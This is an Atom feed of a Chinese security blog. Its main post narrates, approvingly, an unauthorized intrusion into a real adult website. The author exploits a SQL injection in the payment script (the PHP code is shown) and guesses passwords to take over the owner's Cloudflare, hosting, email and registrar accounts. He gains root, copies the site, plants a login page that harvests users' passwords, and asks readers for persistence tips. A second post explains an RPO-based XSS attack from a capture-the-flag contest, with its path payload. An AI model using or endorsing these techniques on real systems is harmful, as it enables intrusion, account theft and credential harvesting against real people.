<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C0d3r1iu&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/0ab97b5f640d12fee2127da9e45fec30</icon>
  <subtitle>Valar Moghulis</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.recorday.cn/"/>
  <updated>2018-12-19T04:29:39.636Z</updated>
  <id>http://blog.recorday.cn/</id>
  
  <author>
    <name>C0d3r1iu</name>
    <email>admin@recorday.cn</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>强行绕开CDN怒怼福利网站</title>
    <link href="http://blog.recorday.cn/2018/10/26/Hack-Record1/"/>
    <id>http://blog.recorday.cn/2018/10/26/Hack-Record1/</id>
    <published>2018-10-26T14:09:50.000Z</published>
    <updated>2018-12-19T04:29:39.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对某福利网站的渗透测试"><a href="#对某福利网站的渗透测试" class="headerlink" title="对某福利网站的渗透测试"></a>对某福利网站的渗透测试</h1><h4 id="Author-C0d3r1iu"><a href="#Author-C0d3r1iu" class="headerlink" title="Author:C0d3r1iu"></a>Author:C0d3r1iu</h4><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>三个月前偶遇一个福利网站,在欣赏网站内容的同时对其进行了检测，最后以root的身份逛了逛他的vps，打包了整站。<br>也算是为净化网络做了一点点贡献。</p><p>首页图片就不放了，过程中很多图当时都没截，还请大家将就一下</p><a id="more"></a><h2 id="0x01-识破虚幻"><a href="#0x01-识破虚幻" class="headerlink" title="0x01 识破虚幻:"></a>0x01 识破虚幻:</h2><p>对于我来说，渗透的本质是有效信息收集和利用(因为基本混不到最新的0day)</p><p>通过浏览器插件Wappalyzer可以知道:</p><pre><code>主站是用wordpress改的，主要运营模式是通过后台发布资源并且配合插件兜售邀请码网站有CDN,还是国外的CloudFlareCDN</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/huanjing.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>扫了一遍目录，没发现什么敏感备份，主站几乎无望</p><p>收集子域名，发现:</p><pre><code>pay.xxx.xxx（用于支付购买其邀请码，类似发卡平台）ss.xxx.xxx （用于给会员提供ss翻墙???）</code></pre><p>其中 pay.xxx.xxx 在网站底部发现是用的EDLM发卡程序</p><p>第一次听说这个程序，去百度搜了一下发现是一个私人写的支付检测并自动发卡的程序，需要在服务器上开启客户端一直监听着支付宝或者微信有无收款信息再配合系统进行发卡确认。</p><p>它的官网貌似也用的和pay这个子站点一样的版本，下载网上流传的免费版审计一波，发现了一处sql盲注</p><p>这个代码写的有点意思，其中特地注释了 “防止sql注入” 差点就把我吓跑了，下面附上自己体会:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断被设置（被修改）后内容是否为空白</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>['text'] != '')&#123;</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `kms` WHERE `dh` LIKE '"</span>.intval(<span class="variable">$_POST</span>['text']).<span class="string">"';"</span>;<span class="comment">//设置sql语句查询此单号是否已使用过</span></span><br><span class="line">  <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行sql语句并获取结果</span></span><br><span class="line">  <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">  <span class="comment">//判断结果是与否</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="comment">//是则执行以下代码</span></span><br><span class="line">    <span class="variable">$_POST</span>['text'] = intval(<span class="variable">$_POST</span>['text']);<span class="comment">//防止sql注入</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `kms` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"';"</span>;<span class="comment">//设置sql语句查询此单号是否已使用过</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行sql语句并获取结果</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">      <span class="variable">$kms</span> .= <span class="variable">$rows</span>['km'].<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `lists` WHERE `spid` LIKE '"</span>.<span class="variable">$row</span>['spid'].<span class="string">"';"</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行sql语句并获取结果</span></span><br><span class="line">    <span class="variable">$sp</span> = <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">    echo '</span><br><span class="line">      &lt;div <span class="keyword">class</span>=<span class="string">"am-panel am-panel-primary"</span> id=<span class="string">"look"</span>&gt;</span><br><span class="line">          &lt;ul <span class="keyword">class</span>=<span class="string">"tpl-task-list tpl-task-remind"</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;center&gt;&lt;span&gt;Tip:查询成功&lt;/span&gt;&lt;/center&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-info"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-location-arrow"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 名称: &lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="variable">$sp</span>['title'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-mixcloud"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 云端单号: &lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="variable">$row</span>['dh'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-danger"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-key"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 卡密: &lt;span <span class="keyword">class</span>=<span class="string">"font-red"</span>&gt;(1行/1个)&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                      &lt;textarea rows=<span class="string">"5"</span>&gt;'.<span class="variable">$kms</span>.'&lt;/textarea&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-warning"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-jpy"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 价格:&lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="variable">$sp</span>['money'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-credit-card"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 支付方式:&lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="variable">$row</span>['mode'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-warning"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-history"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 提卡时间:&lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="built_in">date</span>('Y-<span class="keyword">m</span>-<span class="keyword">d</span> <span class="keyword">H</span>:i:s',<span class="variable">$row</span>['time']).'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    ';<span class="comment">//输出查询结果代码</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//查询支付宝数据是否存在此单号</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `zfb` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"'"</span>;<span class="comment">//设置sql语句查询支付宝单号列表是否存在此单号</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行语句并获取结果</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();<span class="comment">//解析结果并分组</span></span><br><span class="line">    <span class="variable">$mode</span> = '支付宝';</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$row</span>)&#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `qq` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"'"</span>;<span class="comment">//设置sql语句查询QQ单号列表是否存在此单号</span></span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行语句并获取结果</span></span><br><span class="line">      <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();<span class="comment">//解析结果并分组</span></span><br><span class="line">      <span class="variable">$mode</span> = 'QQ钱包';</span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `wx` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"'"</span>;<span class="comment">//设置sql语句查询微信单号列表是否存在此单号</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行语句并获取结果</span></span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();<span class="comment">//解析结果并分组</span></span><br><span class="line">        <span class="variable">$mode</span> = '微信支付';</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>仔细看过后易知，起作用的语句：<br><code>$_POST[&#39;text&#39;] = intval($_POST[&#39;text&#39;])</code><br>被写到第一个if判断正确之后才会执行的流程里面了</p><p>我们只需要让他判断的条件为否，进入else流程内执行sql，就可以传入没有过滤的$_POST[‘text’]了。</p><p>intval函数会把传入的注入语句字符串默认转为0,还好这里没有订单号为0的数据，自然返回的$row也就是NULL,从而php代码会执行else之后的部分，之后的部分他并没有进行过滤。</p><p>并且这个开发作者安全意识并不高，后台管理员密码居然是明文储存的。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/inject.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>尝试本地搭建获得库的结构</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/shujuku.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>简单构造语句写出脚本注出密码成功登录后台，发现除了一片白花花的邀请码其他什么可利用的功能的都没有。(这里当时没截图)</p><p>冷静思考后尝试用注入出来的后台密码去登录主站的后台居然进去了</p><p>主站是wordpress的话，尝试修改配置文件拿shell，可惜每次插入一句话木马，点击保存都会卡几分钟后提示操作失败。猜测是cloudflare CDN把请求拦截了，直接getshell怕是不行了(后来进服务器发现有宝塔btwaf服务，猜测或许是被规则拦截了)</p><p>于是换个思路:</p><pre><code>再收集其信息，确定了几个常用邮箱，开始尝试密码组合登录cloudflare</code></pre><p>不得不说常用密码这个弱点太无敌了，直接登录了他的cloudflare账户。</p><p>汗，这个人为了开个破黄网居然买了这么多不同后缀的域名！</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/cloudflare.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现很多二级域名最开始还没发现 = =！</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/ipxx.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="0x02-回到真实之后"><a href="#0x02-回到真实之后" class="headerlink" title="0x02 回到真实之后:"></a>0x02 回到真实之后:</h2><p>得到服务器真实ip，我们可以进一步搜集信息</p><p>这里说下我的思路：</p><p>在tool.chinaz.com中查看ipwhois</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/ipwhois.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>得到它的vps服务商是CubeCloud的</p><p>百度发现是一家名叫魔方云的主机商</p><p>其他服务器也有在阿里云的，不过主站在魔方云还是先搞主站</p><p>尝试密码组合登录进魔方云主机管理平台(发现他好喜欢用@，密码不是xxxx@就是xxxx@@)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/pass.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/cube.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/vpscp.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>直接可以通过网页管理端申请1小时在线管理终端，蹦出来h5的console，进去就是root权限</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/serverinfo.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里随便翻翻，可以发现他是用宝塔在维护管理服务器的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/baota.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>将其整站源码打包带走，百度盘的资源有300多个。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/ziyuan.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现数据库配置密码也没能逃出我猜测的几个密码集合 233</p><p>给了基友们一些网站的邀请码，站长可能发现新注册的用户跟收钱记录不符，起了疑心把后台管理密码改了。</p><p>遂把他wp后台登录页面改写了下添加了监控账号密码功能，用终端直接wget传上去解压覆盖达到了监控目的，顺便又能蹲一波他常用的密码，结果这个网站所有用户都是通过后台登录的，捕获了一大堆非管理用户…</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/users.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>后又将他的网易邮箱，阿里云，以及通过域名whois查到的域名商dynadot账户都一一缴获了，用常用的几个密码真是太不安全了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/infomation.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>通过部署各种监控代码、查看日志、各种平台注册信息等等发现他不是一个人在战斗，尼玛他们是一个团伙啊！！</p><p>此团人员分布在河南、四川、上海等地</p><p>有人负责发布资源、有人则负责建设和维护网站(显然没有一点点安全意识)</p><p>负责网站建设的是00后，自称鑫爵，颇喜欢用’qq’ + 自己生日 + 一两个@当作密码</p><p>负责收款的30多岁，目测网站月盈利万元，果然赚钱的法子都写在刑法上…</p><h2 id="0x03总结-amp-后续"><a href="#0x03总结-amp-后续" class="headerlink" title="0x03总结&amp;后续:"></a>0x03总结&amp;后续:</h2><p>从这次渗透可以看出来信息收集的重要性，不要放过任何一个可能有用的信息，利用好了可能就是秒杀。</p><p>后续服务器权限并不好控制，被发现后服务器被重置了，vps管理平台密码也被改了，很无奈。<br>中间一些操作有点着急了，使得行为暴露的很彻底(网易和阿里云异地登录记录)。</p><p>各位有什么好的持续控制思路求分享~ 希望能学习下各位的思路 ，可以私信加好友一起玩啊…</p><h2 id="To-Be-Continued"><a href="#To-Be-Continued" class="headerlink" title="To Be Continued:"></a>To Be Continued:</h2><p>距这次渗透已经过去了3个月，最近发现这个团伙换了个域名又开始作案了，发卡平台系统也更新了，真是无语。<br>潜入了那个发卡平台交流群，从公告得知这位开发者已经发现这个漏洞啦(可能是监测到了我注入他官网发的一系列http请求日志)</p><p>我还是太年轻，渗透未完待续…</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/10/26/Hack-Record1/edlm.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>######最后 admin@recorday.cn 求web安全实习机会~</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;对某福利网站的渗透测试&quot;&gt;&lt;a href=&quot;#对某福利网站的渗透测试&quot; class=&quot;headerlink&quot; title=&quot;对某福利网站的渗透测试&quot;&gt;&lt;/a&gt;对某福利网站的渗透测试&lt;/h1&gt;&lt;h4 id=&quot;Author-C0d3r1iu&quot;&gt;&lt;a href=&quot;#Author-C0d3r1iu&quot; class=&quot;headerlink&quot; title=&quot;Author:C0d3r1iu&quot;&gt;&lt;/a&gt;Author:C0d3r1iu&lt;/h4&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;三个月前偶遇一个福利网站,在欣赏网站内容的同时对其进行了检测，最后以root的身份逛了逛他的vps，打包了整站。&lt;br&gt;也算是为净化网络做了一点点贡献。&lt;/p&gt;
&lt;p&gt;首页图片就不放了，过程中很多图当时都没截，还请大家将就一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://blog.recorday.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://blog.recorday.cn/2018/09/25/hello-world/"/>
    <id>http://blog.recorday.cn/2018/09/25/hello-world/</id>
    <published>2018-09-25T01:02:37.361Z</published>
    <updated>2018-01-24T17:03:38.351Z</updated>
    
    <content type="html"><![CDATA[<p>折腾了一整天，才把这新鲜的 “静态博客” 搭建好，期间经历的艰难困苦想必是大家无法想象的。</p><p>因为某些原因，我这里github和CSDN是不能访问的，在linux下克服这个问题，我用了proxychains4 这款神器，搭配“瑞士军刀” —— shadowsocks ，搞了个好点的vpn才算是解决了，然而解决之时，正好也是日落之时，这一天又这样悄悄的过去了。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">'生活是屎一样的三明治，饥饿的你不得不去面对它！'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;折腾了一整天，才把这新鲜的 “静态博客” 搭建好，期间经历的艰难困苦想必是大家无法想象的。&lt;/p&gt;
&lt;p&gt;因为某些原因，我这里github和CSDN是不能访问的，在linux下克服这个问题，我用了proxychains4 这款神器，搭配“瑞士军刀” —— shadowsoc
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS之RPO攻击</title>
    <link href="http://blog.recorday.cn/2018/03/26/XSS-RPO/"/>
    <id>http://blog.recorday.cn/2018/03/26/XSS-RPO/</id>
    <published>2018-03-26T14:09:50.000Z</published>
    <updated>2018-03-27T07:33:26.690Z</updated>
    
    <content type="html"><![CDATA[<h2 id="从强网杯一道XSS初探RPO攻击"><a href="#从强网杯一道XSS初探RPO攻击" class="headerlink" title="从强网杯一道XSS初探RPO攻击"></a>从强网杯一道XSS初探RPO攻击</h2><p>这周末参加了强网杯，被题目虐得一塌糊涂，最终队伍排名160+，尴尬收场</p><p>其中有一道WEB XSS考察的点是RPO，之前不知道，在比赛中查资料学习了，在此梳理一下</p><a id="more"></a><p>我试着用一句话尽可能描述的清楚：</p><h3 id="RPO："><a href="#RPO：" class="headerlink" title="RPO："></a>RPO：</h3><p>浏览器和服务器之间接受url请求之后，由于对url编码解析结果不同，造成引用的资源路径可被伪造</p><p>让我们先看看他们各自的职责：</p><p>服务器：</p><pre><code>1.接受HTTP请求包2.根据url地址返回客户端请求的html以及资源文件</code></pre><p>浏览器：</p><pre><code>1.根据用户输入的url去请求资源以加载网页2.接收服务器返回的html和包含的资源，用规定好的方式把这些 “东西” 显示给用户</code></pre><p>RPO攻击究竟利用点在哪里呢？</p><p>就是/..%2f/在服务器和浏览器下的解析存在差异</p><p>在服务器看来，这是被url编码过的字符串，应该先解码再解析地址</p><p>于是就被解析成了/..// ,代表着回溯到上一个目录</p><p>而浏览器则会认为这是一个目录，目录名叫/..%2f/</p><p>正常访问/index.php 和 /index.php/test/ 返回的页面都是/index.php</p><p>但如果这个页面有如下代码(没有加绝对路径):</p><p><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;static/css/style2.css&quot;&gt;</code></p><p>则会造成浏览器寻找资源路径从原本的<code>/static/css/style2.css</code> 变为 <code>/index.php/static/css/style2.css</code></p><p>从而导致显示样式不正常</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/26/XSS-RPO/error1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/26/XSS-RPO/error.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>危害更大的点则是页面编码时嵌入了../这类不负责任的相对路径，这将提供XSS攻击利用条件</p><p>正如这道CTF题目：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/26/XSS-RPO/rpo1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当我们在此页面相同目录下可控制输出的话，可以构造路径进行xss攻击</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/26/XSS-RPO/rpo2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这道题目就是这样，虽然可以输出任意字符到特定界面，但是被转义得没脾气</p><p>我们不得不求助于rpo，利用其他页面的script标签来帮助我们执行js代码。</p><p>我们要做的是：</p><p>1.写入js代码(为了防止转义这里需要eval(String.fromCharCode)或者以alert(1)作为演示)</p><p>2.构造加载路径,在浏览器中访问： <code>/index.php/view/article/1071/%2f..%2f../</code></p><p>3.让服务器接收我们构造好的路径之后，解析返回存在上述代码的页面</p><p>服务器会认为这个链接请求的资源路径为：<code>/index.php/view/article/1071//../../</code>也就是/index.php/view/，并将<code>/index.php/view/</code>对应的页面返回给浏览器</p><p>4.浏览器接收到/index.php/view/ 这个页面，在解析html代码时，以它的理解，<code>&lt;script src=../static/js/jquery.min.js</code><br>等同于 <code>/index.php/view/article/1071/%2f..%2f../../static/js/jquery.min.js</code></p><p>而<code>/%2f..%2f../</code>被它认作一个目录，<code>/%2f..%2f../../</code> 之间相互抵消了</p><p>因此会加载<code>/index.php/view/article/1071/static/js/jquery.min.js</code> 由于文件不存在，在/1071/之后的字符都当作PATHINFO传参处理了,至此我们成功的将 /1071/界面引入了script标签中，从而执行我们给定的js代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/26/XSS-RPO/rpo33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/26/XSS-RPO/rpo44.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>实际上web安全的面非常广，要学习的点点滴滴还很多，不能浅尝辄止，半途而废</p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="&quot;http://blog.nsfocus.net/rpo-attack/&quot;">http://blog.nsfocus.net/rpo-attack/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;从强网杯一道XSS初探RPO攻击&quot;&gt;&lt;a href=&quot;#从强网杯一道XSS初探RPO攻击&quot; class=&quot;headerlink&quot; title=&quot;从强网杯一道XSS初探RPO攻击&quot;&gt;&lt;/a&gt;从强网杯一道XSS初探RPO攻击&lt;/h2&gt;&lt;p&gt;这周末参加了强网杯，被题目虐得一塌糊涂，最终队伍排名160+，尴尬收场&lt;/p&gt;
&lt;p&gt;其中有一道WEB XSS考察的点是RPO，之前不知道，在比赛中查资料学习了，在此梳理一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="XSS" scheme="http://blog.recorday.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Mysql_Lock</title>
    <link href="http://blog.recorday.cn/2018/03/21/Mysql-Lock/"/>
    <id>http://blog.recorday.cn/2018/03/21/Mysql-Lock/</id>
    <published>2018-03-21T13:22:25.000Z</published>
    <updated>2018-03-21T13:23:03.662Z</updated>
    
